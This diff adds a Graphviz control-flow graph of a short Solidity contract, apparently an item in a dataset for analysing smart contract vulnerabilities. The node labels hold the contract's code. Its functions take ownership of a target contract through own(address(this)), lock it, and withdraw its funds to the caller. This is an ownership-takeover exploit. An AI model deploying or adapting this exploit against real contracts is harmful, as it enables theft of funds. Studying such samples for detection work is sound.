@@ -1,0 +1,30 @@
+digraph  {
+13 [label="2_ function own(address owner) {}\n13-function_definition-3-3", method="own(address owner)", type_label=function_definition];
+20 [label="3_ function releaseFunds(uint amount) {}\n20-function_definition-4-4", method="releaseFunds(uint amount)", type_label=function_definition];
+27 [label="4_ function lock() {}\n27-function_definition-5-5", method="lock()", type_label=function_definition];
+33 [label="7_ address owner;\n33-new_variable-8-8", method="", type_label=new_variable];
+37 [label="8_ HelloEx contr;\n37-new_variable-9-9", method="", type_label=new_variable];
+44 [label="11_ owner = msg.sender;\n44-expression_statement-12-12", method="", type_label=expression_statement];
+50 [label="13_ function setMyContractt(address addr) public\n	{\n		require(owner==msg.sender);\n		contr = HelloEx(addr);\n	}\n50-function_definition-14-18", method="setMyContractt(address addr)", type_label=function_definition];
+58 [label="15_ require(owner==msg.sender);\n58-expression_statement-16-16", method="setMyContractt(address addr)", type_label=expression_statement];
+67 [label="16_ contr = HelloEx(addr);\n67-expression_statement-17-17", method="setMyContractt(address addr)", type_label=expression_statement];
+74 [label="18_ function eexploitOwnn() payable public\n	{\n		require(owner==msg.sender);\n		contr.own(address(this));\n		contr.lock();\n	}\n74-function_definition-19-24", method="eexploitOwnn()", type_label=function_definition];
+79 [label="20_ require(owner==msg.sender);\n79-expression_statement-21-21", method="eexploitOwnn()", type_label=expression_statement];
+88 [label="21_ contr.own(address(this));\n88-expression_statement-22-22", method="eexploitOwnn()", type_label=expression_statement];
+97 [label="22_ contr.lock();\n97-expression_statement-23-23", method="eexploitOwnn()", type_label=expression_statement];
+102 [label="24_ function wwwithdrawww(uint amount) public\n	{\n		require(owner==msg.sender);\n		contr.releaseFunds(amount);\n		msg.sender.transfer(amount * (1 ether));\n	}\n102-function_definition-25-30", method="wwwithdrawww(uint amount)", type_label=function_definition];
+110 [label="26_ require(owner==msg.sender);\n110-expression_statement-27-27", method="wwwithdrawww(uint amount)", type_label=expression_statement];
+119 [label="27_ contr.releaseFunds(amount);\n119-expression_statement-28-28", method="wwwithdrawww(uint amount)", type_label=expression_statement];
+126 [label="28_ msg.sender.transfer(amount * (1 ether));\n126-expression_statement-29-29", method="wwwithdrawww(uint amount)", type_label=expression_statement];
+1 [label="0_ start_node", method="", type_label=start];
+2 [label="0_ exit_node", method="", type_label=exit];
+33 -> 37  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+50 -> 58  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+58 -> 67  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+74 -> 79  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+79 -> 88  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+88 -> 97  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+102 -> 110  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+110 -> 119  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+119 -> 126  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+}
